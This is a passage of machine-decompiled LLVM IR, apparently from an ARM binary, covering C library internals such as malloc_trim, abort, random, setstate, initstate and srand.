  store i32 %v3_137f0, i32* %r2.global-to-local, align 4
  %v1_137f4 = and i32 %v3_137ec, -4
  store i32 %v1_137f4, i32* %r3.global-to-local, align 4
  %v3_137f8 = icmp ult i32 %v1_137f4, %v3_137f0
  br i1 %v3_137f8, label %dec_label_pc_13838, label %dec_label_pc_13800

dec_label_pc_13800:                               ; preds = %bb17
  store i32 %v0_137e8, i32* %r1.global-to-local, align 4
  %v1_13804 = add i32 %v0_137e8, 840
  %v2_13804 = inttoptr i32 %v1_13804 to i32*
  %v3_13804 = load i32, i32* %v2_13804, align 4
  store i32 %v3_13804, i32* %r0.global-to-local, align 4
  %v2_13808 = call i32 @__malloc_trim(i32 %v3_13804, i32 %v0_137e8)
  store i32 %v2_13808, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13838

dec_label_pc_13810:                               ; preds = %dec_label_pc_136d4
  %v2_13810 = inttoptr i32 %v1_136a4 to i32*
  %v3_13810 = load i32, i32* %v2_13810, align 4
  store i32 %v3_13810, i32* %r0.global-to-local, align 4
  %v1_13814 = add i32 %v4_13694, 848
  %v2_13814 = inttoptr i32 %v1_13814 to i32*
  %v3_13814 = load i32, i32* %v2_13814, align 4
  store i32 %v3_13814, i32* %r2.global-to-local, align 4
  %v1_13818 = add i32 %v4_13694, 868
  %v2_13818 = inttoptr i32 %v1_13818 to i32*
  %v3_13818 = load i32, i32* %v2_13818, align 4
  %v2_1381c = add i32 %v3_13810, %v1_136a0
  store i32 %v2_1381c, i32* %r1.global-to-local, align 4
  %v1_13820 = add i32 %v3_13814, -1
  store i32 %v1_13820, i32* %r2.global-to-local, align 4
  %v2_13824 = sub i32 %v3_13818, %v2_1381c
  store i32 %v2_13824, i32* %r3.global-to-local, align 4
  store i32 %v2_13824, i32* %v2_13818, align 4
  %v1_1382c = load i32, i32* @lr, align 4
  %v2_1382c = add i32 %v1_1382c, 848
  %v3_1382c = inttoptr i32 %v2_1382c to i32*
  store i32 %v1_13820, i32* %v3_1382c, align 4
  %v0_13830 = load i32, i32* %r0.global-to-local, align 4
  %v1_13830 = load i32, i32* @r5, align 4
  %v2_13830 = sub i32 %v1_13830, %v0_13830
  store i32 %v2_13830, i32* %r0.global-to-local, align 4
  %v4_13834 = call i32 @munmap(i32 %v2_13830, i32 %v2_1381c, i32 %v1_13820, i32 %v2_13824)
  store i32 %v4_13834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13838

dec_label_pc_13838:                               ; preds = %bb17, %dec_label_pc_137c8, %dec_label_pc_13800, %dec_label_pc_136b4, %dec_label_pc_13810
  store i32 %v2_13648, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_13844 = load i32, i32* @r7, align 4
  %v2_13844 = add i32 %v0_13844, 24
  %v3_13844 = inttoptr i32 %v2_13844 to i32*
  %v4_13844 = load i32, i32* %v3_13844, align 4
  store i32 %v4_13844, i32* @ip, align 4
  store i32 79952, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13844)
  br label %dec_label_pc_13850

dec_label_pc_13850:                               ; preds = %entry, %dec_label_pc_13838
  store i32 %v3_1363c, i32* @r4, align 4
  store i32 %v6_1363c, i32* @r5, align 4
  store i32 %v9_1363c, i32* @r6, align 4
  store i32 %v12_1363c, i32* @r7, align 4
  store i32 %v18_1363c, i32* @lr, align 4
  ret i32 %v2_13648

; uselistorder directives
  uselistorder i32 %v0_137e8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_137a8, { 1, 0 }
  uselistorder i32 %v1_136e8, { 1, 0 }
  uselistorder i32 %v0_136e8, { 1, 0 }
  uselistorder i32 %v3_136bc, { 1, 0 }
  uselistorder i32 %v1_136a0, { 1, 0, 2 }
  uselistorder i32 %v2_1369c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13694, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13644, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_13850, { 1, 0 }
  uselistorder label %dec_label_pc_13838, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_137c8, { 1, 0 }
  uselistorder label %dec_label_pc_13788, { 1, 0 }
  uselistorder label %dec_label_pc_1377c, { 1, 0 }
  uselistorder label %dec_label_pc_13778, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1372c, { 1, 0 }
}

define i32 @function_13860(i32 %arg1) local_unnamed_addr {
dec_label_pc_13860:
  %v0_13860 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13860, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13860
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13860, %bb
  %v10_13874 = phi i32 [ %arg1, %dec_label_pc_13860 ], [ 0, %bb ]
  ret i32 %v10_13874

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13878 = load i32, i32* @r4, align 4
  store i32 %v3_13878, i32* %stack_var_-12, align 4
  %v6_13878 = load i32, i32* @r5, align 4
  %v4_13888 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 32) to i32*), align 4
  store i32 %v4_13888, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_13888, i32* @r0, align 4
  %v0_13898 = call i32 @__malloc_consolidate()
  %v0_1389c = load i32, i32* @r4, align 4
  %v0_138a0 = load i32, i32* @r5, align 4
  %v2_138a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_138a8, i32* @r4, align 4
  store i32 %v6_13878, i32* @r5, align 4
  %v2_138ac = call i32 @__malloc_trim(i32 %v0_1389c, i32 %v0_138a0)
  %v0_138b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138b0, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_138b4 = phi i32 [ %v2_138ac, %entry ], [ 0, %bb ]
  ret i32 %v4_138b4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  %v4_138d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 16) to i32*), align 4
  store i32 80092, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_138d0)
  %v2_138ec = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_138f8 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_138ec, i32 0, i32 32)
  %v0_13900 = load i32, i32* @r5, align 4
  %v2_13900 = add i32 %v0_13900, 26276
  %v3_13900 = inttoptr i32 %v2_13900 to i32*
  %v4_13900 = load i32, i32* %v3_13900, align 4
  %v2_13904 = icmp eq i32 %v4_13900, 0
  br i1 %v2_13904, label %dec_label_pc_1390c, label %dec_label_pc_1394c

dec_label_pc_1390c:                               ; preds = %entry
  store i32 1, i32* %v3_13900, align 4
  br label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_1395c, %dec_label_pc_1390c
  %v0_13918 = load i32, i32* @r5, align 4
  %v2_13918 = add i32 %v0_13918, 880
  store i32 %v2_13918, i32* @r4, align 4
  %v2_13924 = add i32 %v0_13918, 36
  %v3_13924 = inttoptr i32 %v2_13924 to i32*
  %v4_13924 = load i32, i32* %v3_13924, align 4
  call void @__pseudo_branch(i32 %v4_13924)
  %v1_13934 = call i32 @__GI_raise(i32 6)
  %v0_13940 = load i32, i32* @r5, align 4
  %v2_13940 = add i32 %v0_13940, 16
  %v3_13940 = inttoptr i32 %v2_13940 to i32*
  %v4_13940 = load i32, i32* %v3_13940, align 4
  store i32 80204, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13940)
  %v0_13950.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1394c

dec_label_pc_1394c:                               ; preds = %entry, %dec_label_pc_13914
  %v1_13964 = phi i32 [ %v0_13900, %entry ], [ %v0_13950.pre, %dec_label_pc_13914 ]
  %v2_13950 = add i32 %v1_13964, 26276
  %v3_13950 = inttoptr i32 %v2_13950 to i32*
  %v4_13950 = load i32, i32* %v3_13950, align 4
  %v7_13954 = icmp eq i32 %v4_13950, 1
  br i1 %v7_13954, label %dec_label_pc_1395c, label %dec_label_pc_13998

dec_label_pc_1395c:                               ; preds = %dec_label_pc_1394c
  %v2_1395c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1395c, i32* @r4, align 4
  store i32 2, i32* %v3_13950, align 4
  store i32 20, i32* @r2, align 4
  %v2_13974 = bitcast i32* %stack_var_-28 to i8*
  %v3_13974 = call i32 @__GI_memset(i8* %v2_13974, i32 0)
  %v3_13990 = call i32 @__libc_sigaction(i32 6, i32 %v2_1395c, i32 0)
  br label %dec_label_pc_13914

dec_label_pc_13998:                               ; preds = %dec_label_pc_1394c
  %v7_13998 = icmp eq i32 %v4_13950, 2
  br i1 %v7_13998, label %dec_label_pc_139a0, label %dec_label_pc_139ac

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13998
  store i32 3, i32* %v3_13950, align 4
  %v0_139a8 = call i32 @abort()
  %v0_139ac.pre = load i32, i32* @r5, align 4
  %v1_139ac.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_139ac

dec_label_pc_139ac:                               ; preds = %dec_label_pc_13998, %dec_label_pc_139a0
  %v3_139b8 = phi i32 [ 26276, %dec_label_pc_13998 ], [ %v1_139ac.pre, %dec_label_pc_139a0 ]
  %v2_139b8 = phi i32 [ %v1_13964, %dec_label_pc_13998 ], [ %v0_139ac.pre, %dec_label_pc_139a0 ]
  %v2_139ac = add i32 %v2_139b8, %v3_139b8
  %v3_139ac = inttoptr i32 %v2_139ac to i32*
  %v4_139ac = load i32, i32* %v3_139ac, align 4
  %v7_139b0 = icmp eq i32 %v4_139ac, 3
  br i1 %v7_139b0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_139ac
  store i32 4, i32* %v3_139ac, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_139ac, %bb
  call void @__pseudo_cond_branch(i1 %v7_139b0, i32 ptrtoint (i32* @global_var_f9e0.464 to i32))
  br label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %dec_label_pc_139c4, %.thread2
  %v0_139c4 = call i32 @abort()
  br label %dec_label_pc_139c4

; uselistorder directives
  uselistorder i32* %v3_13950, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 5, 4, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_139ac, { 1, 0 }
  uselistorder label %dec_label_pc_1394c, { 1, 0 }
}

define i32 @function_139d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_139d0:
  %v0_139d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_139d0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_139d0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_139d0, %bb
  %v4_139dc = phi i32 [ %arg1, %dec_label_pc_139d0 ], [ 0, %bb ]
  ret i32 %v4_139dc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_139e8 = call i32 @random()
  ret i32 %v0_139e8
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_139f8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  %v4_13a28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13a28)
  %v0_13a3c = load i32, i32* @r4, align 4
  %v2_13a3c = add i32 %v0_13a3c, 16
  %v3_13a3c = inttoptr i32 %v2_13a3c to i32*
  %v4_13a3c = load i32, i32* %v3_13a3c, align 4
  store i32 ptrtoint (i32* @global_var_13a48.470 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13a3c)
  %v2_13a4c = ptrtoint i32* %stack_var_-20 to i32
  %v0_13a50 = load i32, i32* @r4, align 4
  %v2_13a50 = add i32 %v0_13a50, 1056
  %v2_13a54 = inttoptr i32 %v2_13a50 to i32*
  %v3_13a54 = call i32 @__GI_random_r(i32* %v2_13a54, i32 %v2_13a4c)
  %v0_13a64 = load i32, i32* @r4, align 4
  %v2_13a64 = add i32 %v0_13a64, 24
  %v3_13a64 = inttoptr i32 %v2_13a64 to i32*
  %v4_13a64 = load i32, i32* %v3_13a64, align 4
  call void @__pseudo_branch(i32 %v4_13a64)
  %v3_13a70 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_139f8, i32* @r4, align 4
  ret i32 %v3_13a70
}

define i32 @function_13a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_13a84:
  %v0_13a84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a84, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13a84
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13a84, %bb
  %v10_13a98 = phi i32 [ %arg1, %dec_label_pc_13a84 ], [ 0, %bb ]
  ret i32 %v10_13a98

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_13acc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13acc)
  %v0_13ae0 = load i32, i32* @r6, align 4
  %v2_13ae0 = add i32 %v0_13ae0, 16
  %v3_13ae0 = inttoptr i32 %v2_13ae0 to i32*
  %v4_13ae0 = load i32, i32* %v3_13ae0, align 4
  call void @__pseudo_branch(i32 %v4_13ae0)
  %v0_13af0 = load i32, i32* @r6, align 4
  %v2_13af0 = add i32 %v0_13af0, 1056
  %v0_13af8 = load i32, i32* @r5, align 4
  %v1_13afc = add i32 %v0_13af0, 1064
  %v2_13afc = inttoptr i32 %v1_13afc to i32*
  %v3_13afc = load i32, i32* %v2_13afc, align 4
  store i32 %v3_13afc, i32* @r4, align 4
  %v2_13b00 = inttoptr i32 %v2_13af0 to i32*
  %v3_13b00 = call i32 @setstate_r(i32 %v0_13af8, i32* %v2_13b00)
  %v1_13b08 = icmp slt i32 %v3_13b00, 0
  %v3_13b18 = load i32, i32* @r4, align 4
  %v4_13b18 = add i32 %v3_13b18, -4
  %storemerge = select i1 %v1_13b08, i32 0, i32 %v4_13b18
  %v0_13b1c = load i32, i32* @r6, align 4
  %v2_13b1c = add i32 %v0_13b1c, 24
  %v3_13b1c = inttoptr i32 %v2_13b1c to i32*
  %v4_13b1c = load i32, i32* %v3_13b1c, align 4
  call void @__pseudo_branch(i32 %v4_13b1c)
  ret i32 %storemerge
}

define i32 @function_13b3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13b3c:
  %v0_13b3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13b3c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13b3c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13b3c, %bb
  %v10_13b50 = phi i32 [ %arg1, %dec_label_pc_13b3c ], [ 0, %bb ]
  ret i32 %v10_13b50

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_13b8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b8c)
  %v0_13ba0 = load i32, i32* @r4, align 4
  %v2_13ba0 = add i32 %v0_13ba0, 16
  %v3_13ba0 = inttoptr i32 %v2_13ba0 to i32*
  %v4_13ba0 = load i32, i32* %v3_13ba0, align 4
  call void @__pseudo_branch(i32 %v4_13ba0)
  %v0_13bb0 = load i32, i32* @r6, align 4
  %v0_13bb4 = load i32, i32* @r4, align 4
  %v2_13bb4 = add i32 %v0_13bb4, 1056
  %v0_13bb8 = load i32, i32* @r7, align 4
  %v0_13bbc = load i32, i32* @sl, align 4
  store i32 %v0_13bbc, i32* @r0, align 4
  %v1_13bc0 = add i32 %v0_13bb4, 1064
  %v2_13bc0 = inttoptr i32 %v1_13bc0 to i32*
  %v3_13bc0 = load i32, i32* %v2_13bc0, align 4
  store i32 %v3_13bc0, i32* @r5, align 4
  %v4_13bc4 = inttoptr i32 %v0_13bbc to i32*
  %v5_13bc4 = call i32 @__GI_initstate_r(i32* %v4_13bc4, i32 %v0_13bb0, i32 %v0_13bb8, i32 %v2_13bb4)
  %v0_13bd4 = load i32, i32* @r4, align 4
  %v2_13bd4 = add i32 %v0_13bd4, 24
  %v3_13bd4 = inttoptr i32 %v2_13bd4 to i32*
  %v4_13bd4 = load i32, i32* %v3_13bd4, align 4
  call void @__pseudo_branch(i32 %v4_13bd4)
  %v0_13be0 = load i32, i32* @r5, align 4
  %v1_13be0 = add i32 %v0_13be0, -4
  ret i32 %v1_13be0
}

define i32 @function_13bfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13bfc:
  %v0_13bfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13bfc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13bfc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13bfc, %bb
  %v10_13c10 = phi i32 [ %arg1, %dec_label_pc_13bfc ], [ 0, %bb ]
  ret i32 %v10_13c10

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_13c14 = load i32, i32* @r4, align 4
  %v6_13c14 = load i32, i32* @r5, align 4
  %v9_13c14 = load i32, i32* @r6, align 4
  %v15_13c14 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  %v2_13c28 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 904), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_13c44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13c44)
  %v0_13c58 = load i32, i32* @r4, align 4
  %v2_13c58 = add i32 %v0_13c58, 16
  %v3_13c58 = inttoptr i32 %v2_13c58 to i32*
  %v4_13c58 = load i32, i32* %v3_13c58, align 4
  call void @__pseudo_branch(i32 %v4_13c58)
  %v0_13c68 = load i32, i32* @r6, align 4
  store i32 %v0_13c68, i32* @r0, align 4
  %v0_13c6c = load i32, i32* @r4, align 4
  %v2_13c6c = add i32 %v0_13c6c, 1056
  %v2_13c70 = inttoptr i32 %v0_13c68 to i32*
  %v3_13c70 = call i32 @srandom_r(i32* %v2_13c70, i32 %v2_13c6c)
  %v0_13c84 = load i32, i32* @r4, align 4
  %v2_13c84 = add i32 %v0_13c84, 24
  %v3_13c84 = inttoptr i32 %v2_13c84 to i32*
  %v4_13c84 = load i32, i32* %v3_13c84, align 4
  call void @__pseudo_branch(i32 %v4_13c84)
  store i32 %v3_13c14, i32* @r4, align 4
  store i32 %v6_13c14, i32* @r5, align 4
  store i32 %v9_13c14, i32* @r6, align 4
  store i32 %v15_13c14, i32* @lr, align 4
  ret i32 %v2_13c28
}

define i32 @function_13ca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ca0:
  %v0_13ca0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ca0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13ca0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13ca0, %bb
  %v10_13cb4 = phi i32 [ %arg1, %dec_label_pc_13ca0 ], [ 0, %bb ]
  ret i32 %v10_13cb4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13cb8 = load i32, i32* @r4, align 4
  store i32 %v3_13cb8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_13cc0 = add i32 %tmp, 12
  %v2_13cc0 = inttoptr i32 %v1_13cc0 to i8*
  %v3_13cc0 = load i8, i8* %v2_13cc0, align 1
  %v4_13cc0 = zext i8 %v3_13cc0 to i32
  store i32 %v4_13cc0, i32* %r1.global-to-local, align 4
  %v2_13cc4 = icmp eq i8 %v3_13cc0, 0
  store i1 %v2_13cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cc4, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_13ccc12 = add i32 %arg1, 4
  store i32 %v1_13ccc12, i32* %r6.global-to-local, align 4
  %v1_13cd013 = add i32 %tmp, 8
  %v2_13cd014 = inttoptr i32 %v1_13cd013 to i32*
  %v3_13cd015 = load i32, i32* %v2_13cd014, align 4
  store i32 %v3_13cd015, i32* %r0.global-to-local, align 4
  %v3_13cec = add i32 %v3_13cd015, -4
  %v4_13cec = inttoptr i32 %v3_13cec to i32*
  store i32 %v4_13cc0, i32* %v4_13cec, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_13cc8 = add i32 %tmp, 4
  %v3_13cc8 = inttoptr i32 %v2_13cc8 to i32*
  %v4_13cc8 = load i32, i32* %v3_13cc8, align 4
  %v1_13ccc = add i32 %arg1, 4
  store i32 %v1_13ccc, i32* %r6.global-to-local, align 4
  %v1_13cd0 = add i32 %tmp, 8
  %v2_13cd0 = inttoptr i32 %v1_13cd0 to i32*
  %v3_13cd0 = load i32, i32* %v2_13cd0, align 4
  store i32 %v3_13cd0, i32* %r0.global-to-local, align 4
  %v3_13cd8 = sub i32 %v4_13cc8, %v3_13cd0
  %v4_13cdc = sdiv i32 %v3_13cd8, 4
  %v4_13ce0 = sext i8 %v3_13cc0 to i32
  store i32 %v4_13ce0, i32* %r1.global-to-local, align 4
  %v4_13ce8 = mul i32 %v4_13cdc, 5
  %v5_13ce8 = add i32 %v4_13ce8, %v4_13ce0
  %v3_13cf0 = add i32 %v3_13cd0, -4
  %v4_13cf0 = inttoptr i32 %v3_13cf0 to i32*
  store i32 %v5_13ce8, i32* %v4_13cf0, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_13cf8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13cf8 = add i32 %v0_13cf8, -4
  %v2_13cf8 = inttoptr i32 %v1_13cf8 to i32*
  %v3_13cf8 = load i32, i32* %v2_13cf8, align 4
  %v2_13d00 = udiv i32 %v3_13cf8, 5
  %v3_13d00 = urem i32 %v3_13cf8, 5
  store i32 %v2_13d00, i32* %r0.global-to-local, align 4
  store i32 %v3_13d00, i32* %r1.global-to-local, align 4
  %v2_13d08 = icmp ugt i32 %v3_13d00, 3
  %v7_13d08 = icmp eq i32 %v3_13d00, 4
  store i1 %v7_13d08, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r5.global-to-local, align 4
  %v2_13d10 = xor i1 %v7_13d08, true
  %v3_13d10 = and i1 %v2_13d08, %v2_13d10
  br i1 %v3_13d10, label %dec_label_pc_13d78, label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %bb
  %v4_13d1c = mul nuw nsw i32 %v3_13d00, 4
  %v5_13d1c = add i32 %v4_13d1c, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35156)
  %v1_13d20 = add i32 %v4_13d1c, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35136)
  %v2_13d20 = inttoptr i32 %v1_13d20 to i32*
  %v3_13d20 = load i32, i32* %v2_13d20, align 4
  store i32 %v3_13d20, i32* %r5.global-to-local, align 4
  %v6_13d24 = inttoptr i32 %v5_13d1c to i32*
  %v7_13d24 = load i32, i32* %v6_13d24, align 4
  store i32 %v7_13d24, i32* %r7.global-to-local, align 4
  %v2_13d28 = icmp eq i32 %v3_13d00, 0
  store i1 %v2_13d28, i1* %cpsr_z.global-to-local, align 1
  %v1_13d2c = trunc i32 %v3_13d20 to i8
  %v2_13d2c = load i32, i32* %r4.global-to-local, align 4
  %v3_13d2c = add i32 %v2_13d2c, 13
  %v4_13d2c = inttoptr i32 %v3_13d2c to i8*
  store i8 %v1_13d2c, i8* %v4_13d2c, align 1
  %v0_13d30 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d30 = trunc i32 %v0_13d30 to i8
  %v2_13d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_13d30 = add i32 %v2_13d30, 14
  %v4_13d30 = inttoptr i32 %v3_13d30 to i8*
  store i8 %v1_13d30, i8* %v4_13d30, align 1
  %v0_13d34 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d34 = trunc i32 %v0_13d34 to i8
  %v2_13d34 = load i32, i32* %r4.global-to-local, align 4
  %v3_13d34 = add i32 %v2_13d34, 12
  %v4_13d34 = inttoptr i32 %v3_13d34 to i8*
  store i8 %v1_13d34, i8* %v4_13d34, align 1
  %v0_13d38 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13d38, label %dec_label_pc_13d64, label %dec_label_pc_13d3c

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d14
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_13d40 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d40 = add i32 %v0_13d40, -4
  %v2_13d40 = inttoptr i32 %v1_13d40 to i32*
  %v3_13d40 = load i32, i32* %v2_13d40, align 4
  %v2_13d44 = sdiv i32 %v3_13d40, 5
  store i32 %v2_13d44, i32* %r0.global-to-local, align 4
  %v4_13d48 = mul i32 %v2_13d44, 4
  %v5_13d48 = add i32 %v4_13d48, %v0_13d40
  %v1_13d4c = load i32, i32* %r4.global-to-local, align 4
  %v2_13d4c = add i32 %v1_13d4c, 4
  %v3_13d4c = inttoptr i32 %v2_13d4c to i32*
  store i32 %v5_13d48, i32* %v3_13d4c, align 4
  %v0_13d50 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d50 = load i32, i32* %r0.global-to-local, align 4
  %v2_13d50 = add i32 %v1_13d50, %v0_13d50
  %v0_13d54 = load i32, i32* %r5.global-to-local, align 4
  %v2_13d58 = udiv i32 %v2_13d50, %v0_13d54
  %v3_13d58 = urem i32 %v2_13d50, %v0_13d54
  store i32 %v2_13d58, i32* %r0.global-to-local, align 4
  %v0_13d5c = load i32, i32* %r6.global-to-local, align 4
  %v4_13d5c = mul i32 %v3_13d58, 4
  %v5_13d5c = add i32 %v0_13d5c, %v4_13d5c
  store i32 %v5_13d5c, i32* %r1.global-to-local, align 4
  %v1_13d60 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d60 = inttoptr i32 %v1_13d60 to i32*
  store i32 %v5_13d5c, i32* %v2_13d60, align 4
  br label %dec_label_pc_13d64

dec_label_pc_13d64:                               ; preds = %dec_label_pc_13d14, %dec_label_pc_13d3c
  %v0_13d64 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d64 = load i32, i32* %r5.global-to-local, align 4
  %v4_13d64 = mul i32 %v1_13d64, 4
  %v5_13d64 = add i32 %v4_13d64, %v0_13d64
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13d6c = load i32, i32* %r4.global-to-local, align 4
  %v2_13d6c = add i32 %v1_13d6c, 16
  %v3_13d6c = inttoptr i32 %v2_13d6c to i32*
